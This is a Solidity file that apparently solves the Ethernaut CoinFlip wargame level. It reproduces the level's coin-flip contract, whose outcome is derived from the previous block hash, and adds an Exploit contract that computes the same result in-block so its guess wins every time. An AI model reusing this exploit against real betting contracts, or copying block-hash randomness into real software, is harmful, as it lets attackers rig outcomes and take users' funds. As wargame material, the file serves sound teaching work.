pragma solidity ^0.4.18;

// Copy contract from Ethernaut ================================================
contract CoinFlip {
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function CoinFlip() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(block.blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

// Our contract ================================================================
// Block number is public and therefore we can compute the result and send the
// guess in the same blocl
contract Exploit {
  // Create instance of CoinFlip contract
  CoinFlip coinFlipContract = CoinFlip(0x2b6387fd59b84e36fccfbf4939ede84f083e4ec6);

  // Define factor from above contract
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  // Call this function to guess correctly every time
  function guessCorrectly() public returns (bool) {
    // Compute result
    uint256 blockValue = uint256(block.blockhash(block.number-1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false; // winning "guess"

    // Call winning contract
    bool result = coinFlipContract.flip(side);
    return result;
  }
}
